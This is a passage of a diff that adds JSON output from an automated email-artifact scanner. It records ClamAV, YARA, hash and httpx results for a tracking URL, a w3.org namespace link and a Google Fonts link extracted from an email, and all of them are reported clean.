+                    "error": "No JSON lines found in /tmp/httpx_tmp/run_20260411_133138_375202/httpx_output.jsonl"
+                  },
+                  {
+                    "scanner": "httpx",
+                    "mid": "75203985-9c2a-4ce6-990b-bcd61d4a19b4",
+                    "url": "0",
+                    "error": "No JSON lines found in /tmp/httpx_tmp/run_20260411_133139_771572/httpx_output.jsonl"
+                  }
+                ]
+              }
+            },
+            "iocs": []
+          },
+          {
+            "file": {
+              "depth": 2,
+              "flavors": {
+                "mime": [
+                  "application/x-empty"
+                ],
+                "yara": []
+              },
+              "name": "75203985-9c2a-4ce6-990b-bcd61d4a19b4___files",
+              "scanners": [
+                "ScanClamav",
+                "ScanEntropy",
+                "ScanFooter",
+                "ScanHash",
+                "ScanHeader",
+                "ScanTlsh",
+                "ScanYara"
+              ],
+              "size": 0,
+              "source": "HttpxScanner",
+              "tree": {
+                "node": "6d98f33f-f14d-47b2-9446-362db4ad9dfe",
+                "parent": "99f3a200-b347-4d45-80a2-596b6beaa0f6",
+                "root": "3f673c2b-25e9-483b-a5a0-fcb7e5882004"
+              }
+            },
+            "scan": {
+              "clamav": {
+                "elapsed": 21.248777,
+                "flags": [],
+                "/tmp/tmp9eyxonfp": "Empty file",
+                "Known viruses": "3627833",
+                "Engine version": "1.4.3",
+                "Scanned directories": "0",
+                "Scanned files": "0",
+                "Infected files": "0",
+                "Data scanned": "0.00 MB",
+                "Data read": "0.00 MB (ratio 0.00",
+                "Time": "21.207 sec (0 m 21 s)",
+                "Start Date": "2026",
+                "End Date": "2026"
+              },
+              "entropy": {
+                "elapsed": 0.000365,
+                "flags": [],
+                "entropy": 0
+              },
+              "footer": {
+                "elapsed": 0.000127,
+                "flags": [],
+                "footer": {
+                  "_type": "bytes",
+                  "encoding": "base64",
+                  "data": ""
+                },
+                "backslash": ""
+              },
+              "hash": {
+                "elapsed": 0.000834,
+                "flags": [],
+                "md5": "d41d8cd98f00b204e9800998ecf8427e",
+                "sha1": "da39a3ee5e6b4b0d3255bfef95601890afd80709",
+                "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+                "ssdeep": "3::",
+                "tlsh": "TNULL"
+              },
+              "header": {
+                "elapsed": 0.000075,
+                "flags": [],
+                "header": {
+                  "_type": "bytes",
+                  "encoding": "base64",
+                  "data": ""
+                },
+                "backslash": ""
+              },
+              "tlsh": {
+                "elapsed": 0.000119,
+                "flags": []
+              },
+              "yara": {
+                "elapsed": 0.006847,
+                "flags": [],
+                "rules_loaded": 2681,
+                "matches": [],
+                "tags": [],
+                "meta": [],
+                "hex": []
+              }
+            },
+            "iocs": []
+          }
+        ],
+        "archive_children": [
+          {
+            "file": {
+              "depth": 2,
+              "flavors": {
+                "mime": [
+                  "application/x-empty"
+                ],
+                "yara": []
+              },
+              "name": "75203985-9c2a-4ce6-990b-bcd61d4a19b4___files",
+              "scanners": [
+                "ScanClamav",
+                "ScanEntropy",
+                "ScanFooter",
+                "ScanHash",
+                "ScanHeader",
+                "ScanTlsh",
+                "ScanYara"
+              ],
+              "size": 0,
+              "source": "HttpxScanner",
+              "tree": {
+                "node": "6d98f33f-f14d-47b2-9446-362db4ad9dfe",
+                "parent": "99f3a200-b347-4d45-80a2-596b6beaa0f6",
+                "root": "3f673c2b-25e9-483b-a5a0-fcb7e5882004"
+              }
+            },
+            "scan": {
+              "clamav": {
+                "elapsed": 21.248777,
+                "flags": [],
+                "/tmp/tmp9eyxonfp": "Empty file",
+                "Known viruses": "3627833",
+                "Engine version": "1.4.3",
+                "Scanned directories": "0",
+                "Scanned files": "0",
+                "Infected files": "0",
+                "Data scanned": "0.00 MB",
+                "Data read": "0.00 MB (ratio 0.00",
+                "Time": "21.207 sec (0 m 21 s)",
+                "Start Date": "2026",
+                "End Date": "2026"
+              },
+              "entropy": {
+                "elapsed": 0.000365,
+                "flags": [],
+                "entropy": 0
+              },
+              "footer": {
+                "elapsed": 0.000127,
+                "flags": [],
+                "footer": {
+                  "_type": "bytes",
+                  "encoding": "base64",
+                  "data": ""
+                },
+                "backslash": ""
+              },
+              "hash": {
+                "elapsed": 0.000834,
+                "flags": [],
+                "md5": "d41d8cd98f00b204e9800998ecf8427e",
+                "sha1": "da39a3ee5e6b4b0d3255bfef95601890afd80709",
+                "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+                "ssdeep": "3::",
+                "tlsh": "TNULL"
+              },
+              "header": {
+                "elapsed": 0.000075,
+                "flags": [],
+                "header": {
+                  "_type": "bytes",
+                  "encoding": "base64",
+                  "data": ""
+                },
+                "backslash": ""
+              },
+              "tlsh": {
+                "elapsed": 0.000119,
+                "flags": []
+              },
+              "yara": {
+                "elapsed": 0.006847,
+                "flags": [],
+                "rules_loaded": 2681,
+                "matches": [],
+                "tags": [],
+                "meta": [],
+                "hex": []
+              }
+            },
+            "iocs": []
+          }
+        ],
+        "counts": {
+          "total_events": 3,
+          "archive_children": 1
+        }
+      }
+    },
+    {
+      "type": "url",
+      "parent": "75203985-9c2a-4ce6-990b-bcd61d4a19b4",
+      "parent_type": "email",
+      "size": 66,
+      "sha256": "775833c69071432602fa9faa30c422597db457b1632b519f5da5dcc47864208b",
+      "url": "https://demoksa.mickey.fit/api/tracker/237/5963230521/mail_opened/",
+      "analysis": {
+        "artifact_type": "urls",
+        "artifact_name": "https://demoksa.mickey.fit/api/tracker/237/5963230521/mail_opened/",
+        "root_event": {
+          "file": {
+            "depth": 0,
+            "flavors": {
+              "mime": [
+                "text/plain"
+              ],
+              "yara": []
+            },
+            "name": "75203985-9c2a-4ce6-990b-bcd61d4a19b4___urls___2",
+            "scanners": [
+              "ScanClamav",
+              "ScanEntropy",
+              "ScanFooter",
+              "ScanHash",
+              "ScanHeader",
+              "ScanTlsh",
+              "ScanUrl",
+              "ScanYara",
+              "HttpxScanner"
+            ],
+            "size": 66,
+            "source": "",
+            "tree": {
+              "node": "ef3b0190-76a0-4014-89a0-85f4a9a8054b",
+              "parent": "",
+              "root": "ef3b0190-76a0-4014-89a0-85f4a9a8054b"
+            }
+          },
+          "scan": {
+            "clamav": {
+              "elapsed": 20.971759,
+              "flags": [],
+              "Known viruses": "3627833",
+              "Engine version": "1.4.3",
+              "Scanned directories": "0",
+              "Scanned files": "1",
+              "Infected files": "0",
+              "Data scanned": "0.00 MB",
+              "Data read": "0.00 MB (ratio 0.00",
+              "Time": "20.915 sec (0 m 20 s)",
+              "Start Date": "2026",
+              "End Date": "2026"
+            },
+            "entropy": {
+              "elapsed": 0.000078,
+              "flags": [],
+              "entropy": 4.568877884083903
+            },
+            "footer": {
+              "elapsed": 0.000095,
+              "flags": [],
+              "footer": {
+                "_type": "bytes",
+                "encoding": "base64",
+                "data": "bWlja2V5LmZpdC9hcGkvdHJhY2tlci8yMzcvNTk2MzIzMDUyMS9tYWlsX29wZW5lZC8="
+              },
+              "backslash": "mickey.fit/api/tracker/237/5963230521/mail_opened/"
+            },
+            "hash": {
+              "elapsed": 0.000218,
+              "flags": [],
+              "md5": "f46183139f17174f443f6f2e0dc191a7",
+              "sha1": "71673ce154a76865e1681b98ea6d2b97cdff983e",
+              "sha256": "775833c69071432602fa9faa30c422597db457b1632b519f5da5dcc47864208b",
+              "ssdeep": "3:N8Y3OWYZ+MMvE0JYuAH:2Y35RM8E0J0H",
+              "tlsh": "T136A0029649504DE1B67108AD7D56243F2097B2D47EF525ADC6A460A764C852AA1C2428"
+            },
+            "header": {
+              "elapsed": 0.000042,
+              "flags": [],
+              "header": {
+                "_type": "bytes",
+                "encoding": "base64",
+                "data": "aHR0cHM6Ly9kZW1va3NhLm1pY2tleS5maXQvYXBpL3RyYWNrZXIvMjM3LzU5NjMyMzA="
+              },
+              "backslash": "https://demoksa.mickey.fit/api/tracker/237/5963230"
+            },
+            "tlsh": {
+              "elapsed": 0.000098,
+              "flags": []
+            },
+            "url": {
+              "elapsed": 0.000236,
+              "flags": [],
+              "urls": [
+                "https://demoksa.mickey.fit/api/tracker/237/5963230521/mail_opened"
+              ]
+            },
+            "yara": {
+              "elapsed": 0.00489,
+              "flags": [],
+              "rules_loaded": 2681,
+              "matches": [
+                "url",
+                "domain"
+              ],
+              "tags": [],
+              "meta": [],
+              "hex": [],
+              "collection": [],
+              "detection": [],
+              "information": []
+            },
+            "httpxner": {
+              "elapsed": 4.649834,
+              "flags": [],
+              "httpx": [
+                {
+                  "source_type": "external",
+                  "parent_file_id": "065309aa-c5c4-40ad-bd3f-87caa0db7631",
+                  "parent_file_name": "75203985-9c2a-4ce6-990b-bcd61d4a19b4___urls___2",
+                  "input_url": "https://demoksa.mickey.fit/api/tracker/237/5963230521/mail_opened/",
+                  "certificates": [
+                    {
+                      "subject": "CN=demoksa.mickey.fit",
+                      "issuer": "CN=E8, O=Let's Encrypt, C=US",
+                      "validFrom": "2026-03-07T10:26:47Z",
+                      "validTo": "2026-06-05T10:26:46Z",
+                      "serialNumber": "06:BF:50:3C:A1:52:6D:36:A6:4C:50:D1:22:92:AC:E6:93:20"
+                    }
+                  ],
+                  "page": {
+                    "url": "https://demoksa.mickey.fit/api/tracker/237/5963230521/mail_opened/",
+                    "domain": "185.217.127.159",
+                    "ip": "185.217.127.159",
+                    "asn": null,
+                    "asnname": null,
+                    "ptr": null,
+                    "server": "nginx/1.18.0 (Ubuntu)",
+                    "tlsIssuer": "E8",
+                    "tlsValidFrom": "2026-03-07T10:26:47Z",
+                    "tlsValidTo": "2026-06-05T10:26:46Z",
+                    "title": null
+                  },
+                  "final_url": null,
+                  "status_code": 200,
+                  "redirects": [],
+                  "redirect_chain_details": [],
+                  "raw_httpx_output": "/tmp/httpx_tmp/run_20260411_132954_048907/httpx_output.jsonl",
+                  "httpx_run_directory": "/tmp/httpx_tmp/run_20260411_132954_048907",
+                  "downloaded_body_sha256": "84fd27f577844273610485aa225264be0f06a9c10f3237a12684783d8983538c",
+                  "downloaded_body_emitted": true,
+                  "downloaded_body_filename": "185.217.127.159.json",
+                  "screenshot_sha256": "9f3bff8d9b244a59b343b4ae840e610874209d5194adbf13ff42412219b76626",
+                  "screenshot_emitted": true,
+                  "screenshot_filename": "185.217.127.159_screenshot.png"
+                }
+              ]
+            }
+          },
+          "iocs": []
+        },
+        "events": [
+          {
+            "file": {
+              "depth": 1,
+              "flavors": {
+                "mime": [
+                  "application/json"
+                ],
+                "yara": [
+                  "json_file"
+                ]
+              },
+              "name": "75203985-9c2a-4ce6-990b-bcd61d4a19b4___files",
+              "scanners": [
+                "ScanClamav",
+                "ScanEntropy",
+                "ScanFooter",
+                "ScanHash",
+                "ScanHeader",
+                "ScanJson",
+                "ScanTlsh",
+                "ScanYara"
+              ],
+              "size": 137,
+              "source": "HttpxScanner",
+              "tree": {
+                "node": "b4e75754-b04c-4233-9f09-6c6fd6ef282a",
+                "parent": "ef3b0190-76a0-4014-89a0-85f4a9a8054b",
+                "root": "ef3b0190-76a0-4014-89a0-85f4a9a8054b"
+              }
+            },
+            "scan": {
+              "clamav": {
+                "elapsed": 25.171242,
+                "flags": [],
+                "Known viruses": "3627833",
+                "Engine version": "1.4.3",
+                "Scanned directories": "0",
+                "Scanned files": "1",
+                "Infected files": "0",
+                "Data scanned": "0.00 MB",
+                "Data read": "0.00 MB (ratio 0.00",
+                "Time": "25.136 sec (0 m 25 s)",
+                "Start Date": "2026",
+                "End Date": "2026"
+              },
+              "entropy": {
+                "elapsed": 0.000131,
+                "flags": [],
+                "entropy": 4.921928224785795
+              },
+              "footer": {
+                "elapsed": 0.000047,
+                "flags": [],
+                "footer": {
+                  "_type": "bytes",
+                  "encoding": "base64",
+                  "data": "bWlja2V5LmZpdC9hcGkvdHJhY2tlci8yMzcvNTk2MzIzMDUyMS9tYWlsX29wZW5lZC8="
+                },
+                "backslash": "mickey.fit/api/tracker/237/5963230521/mail_opened/"
+              },
+              "hash": {
+                "elapsed": 0.000238,
+                "flags": [],
+                "md5": "171089a073b8d41d74f0d391433585c1",
+                "sha1": "640068c12b33f86ef85125d3a8760a13057392da",
+                "sha256": "84fd27f577844273610485aa225264be0f06a9c10f3237a12684783d8983538c",
+                "ssdeep": "3:YWR4b1BAWs9xEZZ0LFHXs6EaQHL3OWYZ+MMvE0JYuAH:YWyb1BA1C/0tgas35RM8E0J0H",
+                "tlsh": "T1BAC02B420C510CF261B0341C2CE25C3F20F9A6C0269C01ECCA8C50774048ED4ECC3008"
+              },
+              "header": {
+                "elapsed": 0.000039,
+                "flags": [],
+                "header": {
+                  "_type": "bytes",
+                  "encoding": "base64",
+                  "data": "eyJzdGF0dXMiOiAic3VjY2VzcyIsICJ0cmFja2VyIjogNjk0NzgsICJzdWJzY3JpcHQ="
+                },
+                "backslash": "{\"status\": \"success\", \"tracker\": 69478, \"subscript"
+              },
+              "json": {
+                "elapsed": 0.000085,
+                "flags": [
+                  "json_decode_error"
+                ],
+                "keys": []
+              },
+              "tlsh": {
+                "elapsed": 0.000085,
+                "flags": []
+              },
+              "yara": {
+                "elapsed": 0.002921,
+                "flags": [],
+                "rules_loaded": 2681,
+                "matches": [
+                  "url",
+                  "domain"
+                ],
+                "tags": [],
+                "meta": [],
+                "hex": [],
+                "collection": [],
+                "detection": [],
+                "information": []
+              }
+            },
+            "iocs": []
+          }
+        ],
+        "archive_children": [],
+        "counts": {
+          "total_events": 2,
+          "archive_children": 0
+        }
+      }
+    },
+    {
+      "type": "url",
+      "parent": "75203985-9c2a-4ce6-990b-bcd61d4a19b4",
+      "parent_type": "email",
+      "size": 28,
+      "sha256": "bc2f6dc7c808cac26162742bc825e8a60b80be155f4e3ca58b1b111d2422d5e5",
+      "url": "http://www.w3.org/1999/xhtml",
+      "analysis": {
+        "artifact_type": "urls",
+        "artifact_name": "http://www.w3.org/1999/xhtml",
+        "root_event": {
+          "file": {
+            "depth": 0,
+            "flavors": {
+              "mime": [
+                "text/plain"
+              ],
+              "yara": []
+            },
+            "name": "75203985-9c2a-4ce6-990b-bcd61d4a19b4___urls___3",
+            "scanners": [
+              "ScanClamav",
+              "ScanEntropy",
+              "ScanFooter",
+              "ScanHash",
+              "ScanHeader",
+              "ScanTlsh",
+              "ScanUrl",
+              "ScanYara",
+              "HttpxScanner"
+            ],
+            "size": 28,
+            "source": "",
+            "tree": {
+              "node": "60fe2a7a-1be7-4a5e-9eea-28ffab6b4258",
+              "parent": "",
+              "root": "60fe2a7a-1be7-4a5e-9eea-28ffab6b4258"
+            }
+          },
+          "scan": {
+            "clamav": {
+              "elapsed": 20.569707,
+              "flags": [],
+              "Known viruses": "3627833",
+              "Engine version": "1.4.3",
+              "Scanned directories": "0",
+              "Scanned files": "1",
+              "Infected files": "0",
+              "Data scanned": "0.00 MB",
+              "Data read": "0.00 MB (ratio 0.00",
+              "Time": "20.540 sec (0 m 20 s)",
+              "Start Date": "2026",
+              "End Date": "2026"
+            },
+            "entropy": {
+              "elapsed": 0.000099,
+              "flags": [],
+              "entropy": 3.7534344198214433
+            },
+            "footer": {
+              "elapsed": 0.000045,
+              "flags": [],
+              "footer": {
+                "_type": "bytes",
+                "encoding": "base64",
+                "data": "aHR0cDovL3d3dy53My5vcmcvMTk5OS94aHRtbA=="
+              },
+              "backslash": "http://www.w3.org/1999/xhtml"
+            },
+            "hash": {
+              "elapsed": 0.000149,
+              "flags": [],
+              "md5": "46ea01750e37954b8c95579f89fdd1b7",
+              "sha1": "5d6f8cadd22252ff307715949ba136120f3c1ac5",
+              "sha256": "bc2f6dc7c808cac26162742bc825e8a60b80be155f4e3ca58b1b111d2422d5e5",
+              "ssdeep": "3:N1KJS4RKYPG:Cc4sX",
+              "tlsh": "TNULL"
+            },
+            "header": {
+              "elapsed": 0.000039,
+              "flags": [],
+              "header": {
+                "_type": "bytes",
+                "encoding": "base64",
+                "data": "aHR0cDovL3d3dy53My5vcmcvMTk5OS94aHRtbA=="
+              },
+              "backslash": "http://www.w3.org/1999/xhtml"
+            },
+            "tlsh": {
+              "elapsed": 0.000029,
+              "flags": []
+            },
+            "url": {
+              "elapsed": 0.000162,
+              "flags": [],
+              "urls": [
+                "http://www.w3.org/1999/xhtml"
+              ]
+            },
+            "yara": {
+              "elapsed": 0.001895,
+              "flags": [],
+              "rules_loaded": 2681,
+              "matches": [
+                "url",
+                "domain"
+              ],
+              "tags": [],
+              "meta": [],
+              "hex": [],
+              "collection": [],
+              "detection": [],
+              "information": []
+            },
+            "httpxner": {
+              "elapsed": 3.472995,
+              "flags": [],
+              "httpx": [
+                {
+                  "source_type": "external",
+                  "parent_file_id": "f9bcbe7f-a077-4abd-8d7a-ba9272501324",
+                  "parent_file_name": "75203985-9c2a-4ce6-990b-bcd61d4a19b4___urls___3",
+                  "input_url": "http://www.w3.org/1999/xhtml",
+                  "certificates": [
+                    {
+                      "subject": "CN=w3.org",
+                      "issuer": "CN=WE1, O=Google Trust Services, C=US",
+                      "validFrom": "2026-03-13T01:44:36Z",
+                      "validTo": "2026-06-11T02:44:34Z",
+                      "serialNumber": "67:C0:6D:1B:DC:A4:1B:D1:0E:DF:9A:90:6C:1F:B7:98"
+                    }
+                  ],
+                  "page": {
+                    "url": "https://www.w3.org/1999/xhtml",
+                    "domain": "104.18.22.19",
+                    "ip": "104.18.22.19",
+                    "asn": null,
+                    "asnname": null,
+                    "ptr": null,
+                    "server": "cloudflare",
+                    "tlsIssuer": "WE1",
+                    "tlsValidFrom": "2026-03-13T01:44:36Z",
+                    "tlsValidTo": "2026-06-11T02:44:34Z",
+                    "title": "Just a moment..."
+                  },
+                  "final_url": null,
+                  "status_code": 403,
+                  "redirects": [],
+                  "redirect_chain_details": [],
+                  "raw_httpx_output": "/tmp/httpx_tmp/run_20260411_132956_041539/httpx_output.jsonl",
+                  "httpx_run_directory": "/tmp/httpx_tmp/run_20260411_132956_041539",
+                  "screenshot_sha256": "ecc8eb4387808d442ff92a5bdec7a5a4203da08ce637d70720474e1a920edaf0",
+                  "screenshot_emitted": true,
+                  "screenshot_filename": "104.18.22.19_screenshot.png"
+                }
+              ]
+            }
+          },
+          "iocs": []
+        },
+        "events": [],
+        "archive_children": [],
+        "counts": {
+          "total_events": 1,
+          "archive_children": 0
+        }
+      }
+    },
+    {
+      "type": "url",
+      "parent": "75203985-9c2a-4ce6-990b-bcd61d4a19b4",
+      "parent_type": "email",
+      "size": 64,
+      "sha256": "32b8826b06fa1106c53b4e2bd88366fba008d433fb946cd8ec84683c7b12b2b7",
+      "url": "https://fonts.googleapis.com/css?family=Ubuntu:300,400,500,700);",
+      "analysis": {
+        "artifact_type": "urls",
+        "root_event": {
+          "file": {
+            "flavors": {
+              "mime": [
+                "text/plain"
+              ],
+              "yara": []
+            },
+            "scanners": [
+              "ScanClamav",
+              "ScanEntropy",
+              "ScanFooter",
+              "ScanHash",
+              "ScanHeader",
+              "ScanTlsh",
+              "ScanUrl",
+              "ScanYara",
+              "HttpxScanner"
+            ],
+            "depth": 0,
+            "size": 64,
+            "name": "75203985-9c2a-4ce6-990b-bcd61d4a19b4___urls___4",
+            "tree": {
+              "node": "f554a2c0-52f6-4103-9e23-393d0bf625dc",
+              "parent": "",
+              "root": "f554a2c0-52f6-4103-9e23-393d0bf625dc"
+            },
+            "source": ""
+          },
+          "iocs": [],
+          "scan": {
+            "entropy": {
+              "elapsed": 0.000076,
+              "entropy": 4.67000912797917,
+              "flags": []
+            },
+            "clamav": {
+              "elapsed": 20.793123,
+              "Data scanned": "0.00 MB",
+              "Start Date": "2026",
+              "Known viruses": "3627833",
+              "End Date": "2026",
+              "flags": [],
+              "Time": "20.758 sec (0 m 20 s)",
+              "Scanned directories": "0",
+              "Scanned files": "1",
+              "Data read": "0.00 MB (ratio 0.00",
+              "Infected files": "0",
+              "Engine version": "1.4.3"
+            },
+            "footer": {
+              "elapsed": 0.000044,
+              "footer": {
+                "data": "Z29vZ2xlYXBpcy5jb20vY3NzP2ZhbWlseT1VYnVudHU6MzAwLDQwMCw1MDAsNzAwKTs=",
+                "_type": "bytes",
+                "encoding": "base64"
+              },
+              "flags": [],
+              "backslash": "googleapis.com/css?family=Ubuntu:300,400,500,700);"
+            },
+            "header": {
+              "elapsed": 0.00004,
+              "flags": [],
+              "header": {
+                "data": "aHR0cHM6Ly9mb250cy5nb29nbGVhcGlzLmNvbS9jc3M/ZmFtaWx5PVVidW50dTozMDA=",
+                "_type": "bytes",
+                "encoding": "base64"
+              },
+              "backslash": "https://fonts.googleapis.com/css?family=Ubuntu:300"
+            },
+            "httpxner": {
+              "elapsed": 4.960822,
+              "httpx": [
+                {
+                  "downloaded_body_filename": "74.125.206.95.css",
+                  "status_code": 200,
+                  "raw_httpx_output": "/tmp/httpx_tmp/run_20260411_133004_491208/httpx_output.jsonl",
+                  "downloaded_body_sha256": "fa9d903fa21ede93ae8de46c976fff38f0bfcb415b32ba3b300d34c653f2db13",
+                  "parent_file_id": "0710ac1a-3e68-426d-8475-643b88567c0c",
+                  "screenshot_emitted": true,
+                  "source_type": "external",
+                  "redirect_chain_details": [],
+                  "screenshot_sha256": "af36ac71c82cdd7cd08f098059c4e6e5e7e7b27b7bf64af235c73575f758f780",
+                  "parent_file_name": "75203985-9c2a-4ce6-990b-bcd61d4a19b4___urls___4",
+                  "certificates": [
+                    {
+                      "serialNumber": "C5:B7:BE:EF:F9:08:D6:B8:09:2F:6F:E2:16:60:B1:FC",
+                      "subject": "CN=upload.video.google.com",
+                      "validFrom": "2026-03-23T08:38:38Z",
+                      "issuer": "CN=WR2, O=Google Trust Services, C=US",
+                      "validTo": "2026-06-15T08:38:37Z"
+                    }
+                  ],
+                  "final_url": null,
+                  "screenshot_filename": "74.125.206.95_screenshot.png",
+                  "redirects": [],
+                  "httpx_run_directory": "/tmp/httpx_tmp/run_20260411_133004_491208",
+                  "input_url": "https://fonts.googleapis.com/css?family=Ubuntu:300,400,500,700);",
+                  "page": {
+                    "server": "ESF",
+                    "tlsValidTo": "2026-06-15T08:38:37Z",
+                    "tlsValidFrom": "2026-03-23T08:38:38Z",
+                    "domain": "74.125.206.95",
+                    "ip": "74.125.206.95",
+                    "asnname": null,
+                    "title": null,
+                    "asn": null,
+                    "url": "https://fonts.googleapis.com/css?family=Ubuntu:300",
+                    "tlsIssuer": "WR2",
+                    "ptr": null
+                  },
+                  "downloaded_body_emitted": true
+                }
+              ],
+              "flags": []
+            },
+            "tlsh": {
+              "elapsed": 0.000054,
+              "flags": []
+            },
+            "hash": {
+              "elapsed": 0.000152,
+              "sha1": "ad923eafe3258fe009c72b549f85bfed230cb716",
+              "sha256": "32b8826b06fa1106c53b4e2bd88366fba008d433fb946cd8ec84683c7b12b2b7",
+              "flags": [],
+              "tlsh": "T168A00267111C95811A1159C2B3B4BA1E5827146E3D8462946835D4A8A0E42995548545",
+              "ssdeep": "3:N8G6hmHRWWaDaSduKuVj8mp:2IHRSakuKaoG",
+              "md5": "9b6b0372866d5c4d832e33562dc130b7"
+            },
+            "url": {
+              "elapsed": 0.000365,
+              "urls": [
+                "https://fonts.googleapis.com/css?family=Ubuntu:300,400,500,700"
+              ],
+              "flags": []
+            },
+            "yara": {
+              "elapsed": 0.001686,
+              "detection": [],
+              "rules_loaded": 2681,
+              "meta": [],
+              "flags": [],
+              "hex": [],
+              "information": [],
+              "collection": [],
+              "matches": [
+                "url",
+                "domain"
+              ],
+              "tags": []
+            }
+          }
+        },
+        "archive_children": [
+          {
+            "file": {
+              "flavors": {
+                "mime": [
+                  "application/x-empty"
+                ],
+                "yara": []
+              },
+              "scanners": [
+                "ScanClamav",
+                "ScanEntropy",
+                "ScanFooter",
+                "ScanHash",
+                "ScanHeader",
+                "ScanTlsh",
+                "ScanYara"
+              ],
+              "depth": 2,
+              "size": 0,
+              "name": "75203985-9c2a-4ce6-990b-bcd61d4a19b4___files",
+              "tree": {
+                "node": "ee02461b-a616-49f1-be66-5a08c1613a02",
+                "parent": "175df85a-234d-4f1f-bffd-47c904ed31f2",
+                "root": "f554a2c0-52f6-4103-9e23-393d0bf625dc"
+              },
+              "source": "HttpxScanner"
+            },
+            "iocs": [],
+            "scan": {
+              "entropy": {
+                "elapsed": 0.000176,
+                "entropy": 0,
+                "flags": []
+              },
+              "clamav": {
+                "Data scanned": "0.00 MB",
+                "flags": [],
+                "Time": "20.555 sec (0 m 20 s)",
+                "Scanned directories": "0",
+                "Infected files": "0",
+                "elapsed": 20.591798,
+                "Start Date": "2026",
+                "Known viruses": "3627833",
+                "End Date": "2026",
+                "/tmp/tmpud93jn1d": "Empty file",
+                "Scanned files": "0",
+                "Data read": "0.00 MB (ratio 0.00",
+                "Engine version": "1.4.3"
+              },
+              "footer": {
+                "elapsed": 0.000102,
+                "footer": {
+                  "data": "",
+                  "_type": "bytes",
+                  "encoding": "base64"
+                },
+                "flags": [],
+                "backslash": ""
+              },
+              "header": {
+                "elapsed": 0.000069,
+                "flags": [],
+                "header": {
+                  "data": "",
+                  "_type": "bytes",
+                  "encoding": "base64"
+                },
+                "backslash": ""
+              },
+              "tlsh": {
+                "elapsed": 0.000116,
+                "flags": []
+              },
+              "hash": {
+                "elapsed": 0.000568,
+                "sha1": "da39a3ee5e6b4b0d3255bfef95601890afd80709",
+                "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+                "flags": [],
+                "tlsh": "TNULL",
+                "ssdeep": "3::",
+                "md5": "d41d8cd98f00b204e9800998ecf8427e"
+              },
+              "yara": {
+                "elapsed": 0.007496,
+                "rules_loaded": 2681,
+                "meta": [],
+                "flags": [],
+                "hex": [],
+                "matches": [],
+                "tags": []
+              }
+            }
+          }
+        ],
+        "counts": {
+          "total_events": 3,
+          "archive_children": 1
+        },
+        "artifact_name": "https://fonts.googleapis.com/css?family=Ubuntu:300,400,500,700);",
+        "events": [
+          {
+            "file": {
+              "flavors": {
+                "mime": [
+                  "text/plain"
+                ],
+                "yara": []
+              },
+              "scanners": [
+                "ScanClamav",
+                "ScanEntropy",
+                "ScanFooter",
+                "ScanHash",
+                "ScanHeader",
+                "ScanTlsh",
+                "ScanUrl",
+                "ScanYara",
+                "HttpxScanner"
+              ],
+              "depth": 1,
+              "size": 1971,
+              "name": "75203985-9c2a-4ce6-990b-bcd61d4a19b4___files",
+              "tree": {
+                "node": "175df85a-234d-4f1f-bffd-47c904ed31f2",
+                "parent": "f554a2c0-52f6-4103-9e23-393d0bf625dc",
+                "root": "f554a2c0-52f6-4103-9e23-393d0bf625dc"
+              },
+              "source": "HttpxScanner"
+            },
+            "iocs": [],
+            "scan": {
+              "entropy": {
+                "elapsed": 0.000421,
+                "entropy": 5.521574222658879,
+                "flags": []
+              },
+              "clamav": {
+                "elapsed": 25.995029,
+                "Data scanned": "0.00 MB",
+                "Start Date": "2026",
+                "Known viruses": "3627833",
+                "End Date": "2026",
+                "flags": [],
+                "Time": "25.920 sec (0 m 25 s)",
+                "Scanned directories": "0",
+                "Scanned files": "1",
+                "Data read": "0.00 MB (ratio 0.00",
+                "Infected files": "0",
+                "Engine version": "1.4.3"
+              },
+              "footer": {
+                "elapsed": 0.000144,
+                "footer": {
+                  "data": "aHR0cHM6Ly9mb250cy5nb29nbGVhcGlzLmNvbS9jc3M/ZmFtaWx5PVVidW50dTozMDA=",
+                  "_type": "bytes",
+                  "encoding": "base64"
+                },
+                "flags": [],
+                "backslash": "https://fonts.googleapis.com/css?family=Ubuntu:300"
+              },
+              "header": {
+                "elapsed": 0.000078,
+                "flags": [],
+                "header": {
+                  "data": "NzcyDQovKiBjeXJpbGxpYy1leHQgKi8KQGZvbnQtZmFjZSB7CiAgZm9udC1mYW1pbHk=",
+                  "_type": "bytes",
+                  "encoding": "base64"
+                },
+                "backslash": "772\\r\\n/* cyrillic-ext */\\n@font-face {\\n  font-family"
+              },
+              "httpxner": {
+                "elapsed": 82.23056,
+                "httpx": [
+                  {
+                    "downloaded_body_filename": "142.250.154.95.css",
+                    "status_code": 200,
+                    "raw_httpx_output": "/tmp/httpx_tmp/run_20260411_133153_838107/httpx_output.jsonl",
+                    "downloaded_body_sha256": "fa9d903fa21ede93ae8de46c976fff38f0bfcb415b32ba3b300d34c653f2db13",
+                    "parent_file_id": "175df85a-234d-4f1f-bffd-47c904ed31f2",
+                    "screenshot_emitted": true,
+                    "source_type": "external",
+                    "redirect_chain_details": [],
+                    "screenshot_sha256": "af36ac71c82cdd7cd08f098059c4e6e5e7e7b27b7bf64af235c73575f758f780",
+                    "parent_file_name": "75203985-9c2a-4ce6-990b-bcd61d4a19b4___files",
+                    "certificates": [
+                      {
+                        "serialNumber": "A3:FE:66:36:8B:92:41:EE:09:0B:DB:A7:10:F4:B0:8A",
+                        "subject": "CN=upload.video.google.com",
+                        "validFrom": "2026-03-23T08:38:52Z",
+                        "issuer": "CN=WE2, O=Google Trust Services, C=US",
+                        "validTo": "2026-06-15T08:38:51Z"
+                      }
+                    ],
+                    "final_url": null,
+                    "screenshot_filename": "142.250.154.95_screenshot.png",
+                    "redirects": [],
+                    "httpx_run_directory": "/tmp/httpx_tmp/run_20260411_133153_838107",
+                    "input_url": "https://fonts.googleapis.com/css?family=Ubuntu:300",
+                    "page": {
+                      "server": "ESF",
+                      "tlsValidTo": "2026-06-15T08:38:51Z",
+                      "tlsValidFrom": "2026-03-23T08:38:52Z",
+                      "domain": "142.250.154.95",
+                      "ip": "142.250.154.95",
+                      "asnname": null,
+                      "title": null,
+                      "asn": null,
+                      "url": "https://fonts.googleapis.com/css?family=Ubuntu:300",
+                      "tlsIssuer": "WE2",
+                      "ptr": null
+                    },
+                    "downloaded_body_emitted": true
+                  }
+                ],
+                "flags": [
+                  "httpx_error",
+                  "httpx_error",
+                  "httpx_error",
+                  "httpx_error",
+                  "httpx_error",
+                  "httpx_error",
+                  "httpx_error",
+                  "httpx_error",
